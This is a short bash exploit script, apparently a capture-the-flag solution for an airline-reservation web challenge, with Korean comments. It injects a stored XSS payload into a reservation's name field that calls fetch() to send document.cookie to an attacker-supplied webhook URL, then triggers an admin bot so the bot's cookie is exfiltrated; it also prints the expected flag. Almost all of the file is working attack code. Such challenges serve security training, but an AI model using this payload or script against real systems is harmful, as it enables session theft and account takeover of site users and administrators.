#!/bin/bash

# Airline Reservation XSS + Bot - Shell Script Exploit
# Usage: ./exploit.sh [target_url] [webhook_url]

TARGET_URL="${1:-http://localhost:8000}"
WEBHOOK_URL="${2}"

echo "════════════════════════════════════════════════"
echo "  Airline Reservation XSS + Bot Exploit"
echo "  Target: $TARGET_URL"
echo "════════════════════════════════════════════════"
echo ""

if [ -z "$WEBHOOK_URL" ]; then
    echo "[!] Webhook URL이 필요합니다!"
    echo "[!] 사용법: ./exploit.sh [target_url] [webhook_url]"
    echo "[!] 예시: ./exploit.sh http://localhost:8000 https://webhook.site/your-id"
    echo ""
    echo "[*] Webhook 생성: https://webhook.site"
    exit 1
fi

echo "[*] Webhook: $WEBHOOK_URL"
echo ""

# Step 1: 악성 예약 생성
echo "[Step 1] 악성 예약 생성..."
PAYLOAD="<img src=x onerror=\"fetch('$WEBHOOK_URL?flag='+document.cookie)\">"

curl -X POST "$TARGET_URL/api/reservations" \
  -H "Content-Type: application/json" \
  -d "{\"name\":\"$PAYLOAD\",\"seat\":\"7B\"}" \
  -s | jq .
echo ""

# Step 2: Admin Bot 트리거
echo "[Step 2] Admin Bot 트리거..."
sleep 1

curl -X GET "$TARGET_URL/report?path=index.html" -s
echo ""
echo ""

echo "[+] Exploit 완료!"
echo "[+] Webhook을 확인하세요: $WEBHOOK_URL"
echo "[+] FLAG 형식: Whois2025{XSS_1n_A1rl1n3_R3s3rv4t10n_Syst3m_2025}"
echo ""

# 현재 예약 목록 확인
echo "[*] 현재 예약 목록:"
curl -X GET "$TARGET_URL/api/reservations" -s | jq .
